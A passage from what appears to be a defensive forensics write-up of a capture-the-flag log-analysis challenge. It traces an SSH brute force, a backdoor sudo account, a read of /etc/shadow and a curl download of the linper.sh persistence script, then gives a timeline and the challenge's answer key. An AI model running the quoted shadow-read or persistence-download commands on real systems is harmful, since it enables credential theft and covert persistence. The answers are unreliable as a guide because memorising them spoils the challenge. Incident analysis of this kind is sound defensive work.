Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information

```

Shortly after, the users password is set.

Skipping some cron activity, less than a minute later, `usermod` is used to add cyberjunkie to the `sudo` group:

```

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'

```

`sudo`, or super-user do, is a utility to allow non-root users to run specific commands as another user. The `sudo` group is for users who can run any command as root with `sudo`. cyberjunkie is the answer to Task 5.

Create Account is a technique under persistence on the Mitre Att&ck matrix:

![image-20240406150932897](/img/image-20240406150932897.png)

The ID for creating a local account is [T1136.001](https://attack.mitre.org/techniques/T1136/001/) (Task 6).

Shortly after that, the session disconnects:

```

Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184

```

So the total time of the session is 06:32:45 - 06:37:24, of 279 seconds (Task 7).

## cyberjunkie Session

### Connection

The other successful authentication in `auth.log` is from the newly created cyberjunkie user at 06:37:34:

```

Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)

```

`wtmp` shows the session starting one second later:

```

[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]

```

### Activity

Once logged in, there are a few actions that the cyberjunkie user takes that are logged in `auth.log`. At 06:37:57, they print the `/etc/shadow` file containing the password hashes for the users on the system using `sudo`:

```

Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root

```

About a minute later they download `linper.sh` from GitHub:

```

Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root

```

So the command run is `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` (Task 8).

The logs don’t have any activity beyond that.

## Results

### Timeline

Putting all that together makes the following timeline:

| Time (UTC) | Description | Reference |
| --- | --- | --- |
| 06:18:01 | First entry in `auth.log`. | `auth.log` |
| 06:31:33 | SSH brute force start | `auth.log` |
| 06:31:40 | root SSH login successful | `auth.log` |
| 06:31:42 | SSH brute force stop | `auth.log` |
| 06:32:44 | SSH login as root | `auth.log` |
| 06:32:45 | Terminal session starts as root | `wtmp` |
| 06:34:18 | cyberjunkie user and group created | `auth.log` |
| 06:35:15 | cyberjunkie added to sudo group | `auth.log` |
| 06:37:24 | root session disconnects | `auth.log` |
| 06:37:34 | SSH login as cyberjunkie | `auth.log` |
| 06:37:35 | Terminal session starts as cyberjunkie | `wtmp` |
| 06:37:57 | cyberjunkie accesses `/etc/shadow` | `auth.log` |
| 06:39:38 | cyberjunkie downloads `linper.sh` | `auth.log` |
| 06:41:01 | Last entry in `auth.log` | `auth.log` |

### Question Answers
1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
   65.2.161.68
2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

   root
3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

   2024-03-06 06:32:45
4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?

   37
5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

   cyberjunkie
6. What is the MITRE ATT&CK sub-technique ID used for persistence?

   T1136.001
7. How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

   279
8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

   /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh